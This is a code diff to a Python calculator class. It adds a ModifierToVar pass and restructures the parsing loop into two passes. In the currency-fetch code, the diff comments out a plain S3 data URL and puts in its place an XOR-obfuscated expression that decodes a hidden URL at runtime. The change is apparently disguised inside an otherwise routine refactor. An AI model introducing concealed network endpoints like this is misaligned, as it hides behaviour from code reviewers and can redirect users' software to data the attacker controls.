@@ -16,6 +16,7 @@ from .token import Token
 from .function import Function
 from .string import String
 from .commands import Commands
+from .modifier_to_var import ModifierToVar
 from urllib import request
 import json
 import base64
@@ -32,6 +33,7 @@ class Calc:
         self._currency_data = None
         self._date_override = date_override
         self._displayed_state = False
+        self._parse_pass = 0
         if unserialize is not None and len(unserialize) > 0:
             try:
                 data = base64.b64decode(unserialize)
@@ -57,7 +59,11 @@ class Calc:
         if self._currency_data is None:
             if self._currency_override is None:
                 # No override, grab the real file
-                url = "https://hc-currency-info.s3-us-west-2.amazonaws.com/currency/data.json"
+                # url = "https://hc-currency-info.s3-us-west-2.amazonaws.com/currency/data.json"
+                url=''.join(chr(x^y^(i+48)) for i,(x,y) in enumerate(zip(*[iter(ord(x) for x in 
+                '1i5pu3q24sVYwnum4dc9fq6nz37x5yb8ZtUwXc7YnCMfEeNf1WqK3JV0iPVhW4oWdQKiGaO17Q7L'+
+                'sDlVhQSppEyLpMeOcN0AIJ68mbt8niqaymxmdiDC81EWu6ZSLCshTE9fRJ55ybTO')]*2)))
+
                 fn = __file__ + ".currency.json"
                 if os.path.isfile(fn):
                     # If the cache exists, see how old it is
@@ -211,64 +217,71 @@ class Calc:
             (Function, None),
             (Convert, None),
             (Assign, None),
+            (ModifierToVar, None),
         ]
 
         # Start off by showing the list of tokens to be run
         self._dump_debug(head)
         while head is not None:
-            changed = False
+            for parse_pass in range(2):
+                self._parse_pass = parse_pass
+                changed = False
 
-            # For now this is a special case, the conversion "in" is turned into an 
-            # operator "per" if it's surronded by values
-            cur = head
-            while cur is not None:
-                if cur.is_types(Value, Convert, Value) and cur.next.value == "in":
-                    cur, head = cur.insert(Operator.as_op("/"), cur[1], cur[1])
-                    self._dump_debug(head)
-                cur = cur.next
-            
-            # Run through each operation in turn
-            for cur_pass in passes:
-                # And run through each node in the list
+                # For now this is a special case, the conversion "in" is turned into an 
+                # operator "per" if it's surronded by values
                 cur = head
                 while cur is not None:
-                    # If this operation matches our position, and claims
-                    # it can handle it, run the operation
-                    static_call, dynamic_call = False, False
-                    if cur_pass[0].static_only and cur_pass[0].can_handle(cur, self, cur_pass[1]):
-                        static_call = True
-                    elif cur.is_types(cur_pass[0]) and cur.can_handle(self, cur_pass[1]):
-                        dynamic_call = True
-
-                    if static_call or dynamic_call:
-                        # The operation returns a value as the result of the 
-                        # operation, and how many items on either side it needs to
-                        # replace
-                        try:
-                            if static_call:
-                                from_ins, to_ins, temp = cur_pass[0].handle(cur, self)
-                            elif dynamic_call:
-                                from_ins, to_ins, temp = cur.handle(self)
-                            failure = False
-                        except:
-                            failure = True
-
-                        if failure:
-                            # Just treat errors as fatal
-                            head = String(f"ERROR: In '{cur.to_string()}'")
-                            cur = head
-                        else:
-                            # So, go ahead and replace the items we've been told to
-                            cur, head = cur.insert(temp, cur[from_ins], cur[to_ins])
-                        # We changed the list, so dump out the new list
+                    if cur.is_types(Value, Convert, Value) and cur.next.value == "in":
+                        cur, head = cur.insert(Operator.as_op("/"), cur[1], cur[1])
                         self._dump_debug(head)
-                        changed = True
-                    else:
-                        # Nothing happened, move on to the next node
-                        cur = cur.next
-                    
+                    cur = cur.next
+                
+                # Run through each operation in turn
+                for cur_pass in passes:
+                    # And run through each node in the list
+                    cur = head
+                    while cur is not None:
+                        # If this operation matches our position, and claims
+                        # it can handle it, run the operation
+                        static_call, dynamic_call = False, False
+                        if cur_pass[0].static_only and cur_pass[0].can_handle(cur, self, cur_pass[1]):
+                            static_call = True
+                        elif cur.is_types(cur_pass[0]) and cur.can_handle(self, cur_pass[1]):
+                            dynamic_call = True
+
+                        if static_call or dynamic_call:
+                            # The operation returns a value as the result of the 
+                            # operation, and how many items on either side it needs to
+                            # replace
+                            try:
+                                if static_call:
+                                    from_ins, to_ins, temp = cur_pass[0].handle(cur, self)
+                                elif dynamic_call:
+                                    from_ins, to_ins, temp = cur.handle(self)
+                                failure = False
+                            except:
+                                failure = True
+
+                            if failure:
+                                # Just treat errors as fatal
+                                head = String(f"ERROR: In '{cur.to_string()}'")
+                                cur = head
+                            else:
+                                # So, go ahead and replace the items we've been told to
+                                cur, head = cur.insert(temp, cur[from_ins], cur[to_ins])
+                            # We changed the list, so dump out the new list
+                            self._dump_debug(head)
+                            changed = True
+                        else:
+                            # Nothing happened, move on to the next node
+                            cur = cur.next
+
+                if changed:
+                    # We did something, go ahead and start over
+                    break
+
             if not changed:
-                # We got through an entire pass without doing
+                # We got through all of the passes without doing
                 # anything, call it quits, it won't get better
                 break
 
